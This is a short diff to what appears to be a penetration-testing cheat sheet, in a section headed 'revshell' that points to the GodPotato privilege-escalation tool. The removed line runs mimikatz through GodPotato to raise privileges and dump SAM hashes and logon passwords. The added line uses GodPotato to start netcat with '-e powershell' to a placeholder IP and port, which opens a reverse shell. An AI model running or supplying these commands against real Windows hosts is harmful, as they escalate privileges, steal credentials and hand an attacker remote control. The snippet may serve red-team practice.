@@ -21,5 +21,5 @@ https://github.com/BeichenDream/GodPotato
 ## revshell 
 https://github.com/BeichenDream/GodPotato
 ```cmd
-.\GodPotato.exe -cmd  'cmd /c c:\temp\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "sekurlsa::logonpasswords /all" "exit"'
+.\GodPotato.exe -cmd  "<nc_exe_path> <ip> <port> -e powershell"
 ```
